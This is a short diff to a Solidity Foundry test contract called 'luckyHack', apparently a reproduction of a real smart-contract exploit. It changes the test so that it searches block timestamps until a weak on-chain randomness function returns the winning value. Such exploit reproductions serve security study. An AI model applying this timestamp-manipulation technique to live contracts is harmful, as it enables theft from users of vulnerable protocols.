@@ -74,7 +74,18 @@ contract luckyHack is Test {
     }
 
     function testExploit() public {
-        vm.warp(1_661_351_167);
+        // Search a lucky (difficulty, timestamp) pair. Anvil load-state may report
+        // difficulty/prevrandao different from mainnet, so a fixed warp often fails offline.
+        uint256 baseTs = block.timestamp;
+        bool found;
+        for (uint256 i = 0; i < 4096; i++) {
+            vm.warp(baseTs + i);
+            if (getRandom() == 1) {
+                found = true;
+                break;
+            }
+        }
+        require(found, "Not lucky");
         console.log("getRandom", getRandom());
 
         uint256 amount = 10;
